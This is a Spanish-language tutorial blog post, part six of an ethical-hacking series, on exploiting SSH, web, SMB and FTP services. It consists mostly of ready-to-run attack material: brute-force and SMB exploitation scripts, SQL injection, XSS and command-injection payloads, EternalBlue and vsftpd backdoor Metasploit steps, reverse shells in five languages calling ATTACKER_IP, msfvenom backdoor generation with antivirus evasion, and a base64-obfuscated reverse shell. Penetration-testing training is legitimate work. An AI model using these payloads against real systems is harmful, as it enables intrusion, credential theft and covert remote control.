---
title: "Hacking Ético desde 0 - Parte 6: Explotación de Servicios Comunes"
date: 2025-09-07 10:00:00 +0100
categories: [Hacking Ético, Ciberseguridad]
tags: [hacking-etico, pentesting, explotacion, metasploit, ssh, ftp, smb, web-exploitation]
---

## 🎯 Introducción

¡Bienvenidos a la **sexta entrega** de "Hacking Ético desde 0"! Hasta ahora hemos cubierto reconocimiento, escaneo y análisis de vulnerabilidades. Es momento de dar el paso crucial: **la explotación**.

En este tutorial aprenderemos a explotar servicios comunes de manera profesional y ética, utilizando tanto herramientas automatizadas como técnicas manuales.

⚠️ **RECORDATORIO ÉTICO**: Todo lo aquí enseñado debe usarse ÚNICAMENTE en entornos autorizados para pruebas de penetración legítimas.

## 🔍 ¿Qué es la Explotación?

La **explotación** es el proceso de aprovechar una vulnerabilidad identificada para obtener acceso no autorizado a un sistema o comprometer su funcionamiento.

### Tipos de Explotación:

- **Remote Code Execution (RCE)**: Ejecutar código remotamente
- **Local Privilege Escalation**: Escalar privilegios localmente  
- **Buffer Overflow**: Aprovechamiento de desbordamientos
- **SQL Injection**: Inyección en bases de datos
- **Authentication Bypass**: Evadir autenticación
- **Configuration Exploitation**: Aprovechar malas configuraciones

## 🛠️ Metasploit Framework - El Arsenal Principal

### Instalación y Configuración

```bash
# Metasploit viene preinstalado en Kali Linux
msfconsole

# Inicializar base de datos
sudo msfdb init

# Verificar status
sudo msfdb status

# Actualizar Metasploit
sudo msfupdate
```

### Conceptos Fundamentales

```bash
# Estructura de Metasploit
# Exploits: Código que aprovecha vulnerabilidades
# Payloads: Código que se ejecuta tras la explotación
# Auxiliary: Módulos auxiliares (scanners, fuzzers)
# Post: Módulos de post-explotación
# Encoders: Codificadores para evadir detección
```

### Comandos Básicos

```bash
# Buscar exploits
search apache
search type:exploit platform:linux
search cve:2021-44228

# Información del exploit
info exploit/linux/http/apache_mod_cgi_bash_env_exec

# Usar exploit
use exploit/linux/http/apache_mod_cgi_bash_env_exec

# Ver opciones
show options
show payloads
show targets

# Configurar parámetros
set RHOSTS 192.168.1.100
set RPORT 80
set LHOST 192.168.1.50

# Ejecutar exploit
exploit
run
```

## 🎯 Explotación de Servicios SSH

### 1. Ataques de Fuerza Bruta

```bash
# Con Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Con listas personalizadas
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Con Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### 2. Explotación de Vulnerabilidades SSH

```bash
# CVE-2016-6515 (User enumeration)
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run

# SSH key-based attacks
ssh-keyscan 192.168.1.100
ssh-audit 192.168.1.100
```

### 3. Script de Automatización SSH

```bash
#!/bin/bash
# ssh_exploit.sh - Automatización de ataques SSH

TARGET=$1
USERLIST="admin,root,user,test,guest"
PASSLIST="/usr/share/wordlists/rockyou.txt"

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <target>"
    exit 1
fi

echo "[+] Iniciando ataques SSH contra: $TARGET"

# 1. Banner grabbing
echo "[+] Obteniendo banner SSH..."
nc $TARGET 22 | head -1

# 2. Enumeración de usuarios
echo "[+] Enumerando usuarios..."
for user in $(echo $USERLIST | tr ',' ' '); do
    timeout 5 ssh -o ConnectTimeout=3 $user@$TARGET "echo 'Usuario válido: $user'" 2>/dev/null
done

# 3. Fuerza bruta con usuarios comunes
echo "[+] Ejecutando fuerza bruta..."
hydra -L <(echo $USERLIST | tr ',' '\n') -P $PASSLIST ssh://$TARGET -t 4

echo "[+] Escaneo SSH completado"
```

## 🌐 Explotación de Servicios Web

### 1. Inyección SQL

```bash
# Detección manual
curl "http://target.com/login.php?id=1'" 
curl "http://target.com/login.php?id=1 OR 1=1--"

# Con SQLMap
sqlmap -u "http://target.com/login.php?id=1" --dbs
sqlmap -u "http://target.com/login.php?id=1" -D database --tables
sqlmap -u "http://target.com/login.php?id=1" -D database -T users --dump

# POST injection
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --dbs
```

### 2. Cross-Site Scripting (XSS)

```javascript
// Payloads básicos XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Bypass de filtros
<ScRiPt>alert('XSS')</ScRiPt>
javascript:alert('XSS')
<iframe src="javascript:alert('XSS')">
```

### 3. Command Injection

```bash
# Payloads de command injection
; ls -la
| whoami
& id
`whoami`
$(whoami)

# Ejemplo en parámetro web
curl "http://target.com/ping.php?host=127.0.0.1;cat /etc/passwd"
```

### 4. Script de Explotación Web

```python
#!/usr/bin/env python3
# web_exploit.py - Automatización de ataques web

import requests
import urllib.parse
import sys

def test_sql_injection(url, param):
    """Test básico de SQL injection"""
    payloads = [
        "'",
        "1' OR '1'='1",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1'; DROP TABLE users--"
    ]
    
    print(f"[+] Testeando SQL injection en {param}")
    
    for payload in payloads:
        data = {param: payload}
        try:
            response = requests.post(url, data=data, timeout=5)
            if "error" in response.text.lower() or "mysql" in response.text.lower():
                print(f"[!] Posible SQL injection con payload: {payload}")
        except:
            continue

def test_xss(url, param):
    """Test básico de XSS"""
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')"
    ]
    
    print(f"[+] Testeando XSS en {param}")
    
    for payload in payloads:
        data = {param: payload}
        try:
            response = requests.post(url, data=data, timeout=5)
            if payload in response.text:
                print(f"[!] Posible XSS con payload: {payload}")
        except:
            continue

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 web_exploit.py <URL> <parameter>")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    test_sql_injection(url, param)
    test_xss(url, param)
```

## 🗃️ Explotación de Servicios SMB

### 1. EternalBlue (MS17-010)

```bash
# Verificar vulnerabilidad
nmap --script smb-vuln-ms17-010 192.168.1.100

# Explotar con Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### 2. SMB Enumeration y Ataques

```bash
# Enumeración básica
smbclient -L //192.168.1.100
enum4linux 192.168.1.100

# Acceso a shares
smbclient //192.168.1.100/ADMIN$ -U administrator
smbclient //192.168.1.100/C$ -U ""

# Con Metasploit
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set SMBPass password123
run
```

### 3. Script de Explotación SMB

```bash
#!/bin/bash
# smb_exploit.sh - Explotación automatizada SMB

TARGET=$1

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <target>"
    exit 1
fi

echo "[+] Iniciando explotación SMB: $TARGET"

# 1. Verificar vulnerabilidad EternalBlue
echo "[+] Verificando MS17-010..."
nmap --script smb-vuln-ms17-010 $TARGET -p 445

# 2. Enumeración de shares
echo "[+] Enumerando shares..."
smbclient -L //$TARGET -N

# 3. Intentar acceso anónimo
echo "[+] Intentando acceso anónimo..."
smbclient //$TARGET/IPC$ -N -c "ls"

# 4. Fuerza bruta básica
echo "[+] Fuerza bruta básica..."
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://$TARGET

echo "[+] Explotación SMB completada"
```

## 📁 Explotación de Servicios FTP

### 1. Ataques Básicos FTP

```bash
# Fuerza bruta
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100

# Con Metasploit
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Anonymous FTP
ftp 192.168.1.100
# Username: anonymous
# Password: (vacío o email)
```

### 2. Vulnerabilidades FTP Comunes

```bash
# vsftpd 2.3.4 backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
exploit

# ProFTPD vulnerabilities
search proftpd
use exploit/linux/ftp/proftp_sreplace
set RHOSTS 192.168.1.100
set payload linux/x86/shell_reverse_tcp
exploit
```

## 🚀 Técnicas Avanzadas de Explotación

### 1. Buffer Overflow Básico

```python
#!/usr/bin/env python3
# basic_bof.py - Buffer overflow básico

import socket
import sys

def exploit_bof(target, port):
    """Explotación básica de buffer overflow"""
    
    # Crear patrón para encontrar offset
    pattern = b"A" * 100 + b"B" * 4 + b"C" * 100
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(pattern)
        s.close()
        print("[+] Payload enviado")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 basic_bof.py <target> <port>")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2])
    exploit_bof(target, port)
```

### 2. Reverse Shell Generation

```bash
# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat reverse shell
nc -e /bin/sh ATTACKER_IP 4444

# PowerShell reverse shell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
```

### 3. Meterpreter Avanzado

```bash
# Generar payloads personalizados
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > backdoor.exe

# Configurar listener
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit

# Comandos útiles en Meterpreter
sysinfo
getuid
ps
migrate <PID>
hashdump
screenshot
webcam_snap
keylogger_start
```

## 🧪 Laboratorio Práctico

### Ejercicio 1: Metasploitable 2

```bash
# 1. Descargar e instalar Metasploitable 2
# 2. Escanear servicios vulnerables
nmap -sV -A <METASPLOITABLE_IP>

# 3. Explotar vsftpd backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <METASPLOITABLE_IP>
exploit

# 4. Explotar Samba
use exploit/multi/samba/usermap_script
set RHOSTS <METASPLOITABLE_IP>
set payload cmd/unix/reverse
set LHOST <ATTACKER_IP>
exploit
```

### Ejercicio 2: DVWA (Damn Vulnerable Web Application)

```bash
# 1. Configurar DVWA en laboratorio
# 2. SQL Injection
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=xxx; security=low" --dbs

# 3. Command Injection
curl "http://dvwa/vulnerabilities/exec/?ip=127.0.0.1;cat /etc/passwd&Submit=Submit" --cookie="PHPSESSID=xxx; security=low"
```

## 🛡️ Evasión de Defensas

### 1. Evasión de Antivirus

```bash
# Codificar payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded_payload.exe

# Usar templates
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x /path/to/template.exe -f exe > templated_payload.exe
```

### 2. Evasión de IDS/IPS

```bash
# Fragmentación de paquetes
nmap -f target.com

# Decoy scanning
nmap -D RND:10 target.com

# Source port spoofing
nmap --source-port 53 target.com
```

### 3. Técnicas de Ofuscación

```python
#!/usr/bin/env python3
# obfuscated_payload.py - Payload ofuscado

import base64
import subprocess

# Payload codificado en base64
encoded_payload = "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4xLjUwIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn"

# Decodificar y ejecutar
decoded = base64.b64decode(encoded_payload).decode()
subprocess.call(decoded, shell=True)
```

## 📊 Documentación de Explotación

### Template de Reporte de Explotación

```markdown
# Reporte de Explotación

## Información del Target
- **IP/Hostname**: target.example.com
- **SO**: Linux Ubuntu 18.04
- **Servicios**: SSH, HTTP, SMB

## Vulnerabilidad Explotada
- **CVE**: CVE-YYYY-XXXXX
- **Descripción**: Buffer overflow en servicio X
- **CVSS**: 9.8 (Crítico)

## Metodología de Explotación
1. Reconocimiento inicial
2. Identificación de la vulnerabilidad
3. Búsqueda de exploit
4. Adaptación del exploit
5. Ejecución controlada

## Evidencia de Explotación
- Comandos ejecutados
- Screenshots del acceso obtenido
- Archivos de evidencia

## Impacto Demostrado
- Acceso shell como root
- Lectura de archivos sensibles
- Capacidad de persistencia

## Remediación
- Aplicar parche security-update-X
- Configurar firewall
- Implementar monitoreo
```

## 🎯 Próximos Pasos

En el **próximo tutorial** cubriremos:

1. **Post-Explotación y Persistencia**
2. **Escalada de Privilegios**
3. **Lateral Movement**
4. **Data Exfiltration**
5. **Covering Tracks**

## 📚 Recursos Adicionales

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io/)
- [Exploit Development Tutorial](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)

## 🎓 Conclusión

La explotación es donde la teoría se convierte en práctica real. Las claves del éxito son:

1. **Metodología sistemática** - Seguir un proceso ordenado
2. **Verificación múltiple** - Confirmar vulnerabilidades antes de explotar
3. **Documentación meticulosa** - Registrar cada paso para reportes
4. **Responsabilidad ética** - Actuar siempre dentro de los límites legales
5. **Mejora continua** - Practicar en laboratorios controlados

Recuerda: el objetivo no es causar daño, sino **demostrar el riesgo real** para que pueda ser mitigado apropiadamente.

En la próxima entrega profundizaremos en la post-explotación, donde realmente se demuestra el impacto completo de las vulnerabilidades.

---

**Andrés Nuñez - t4ifi**
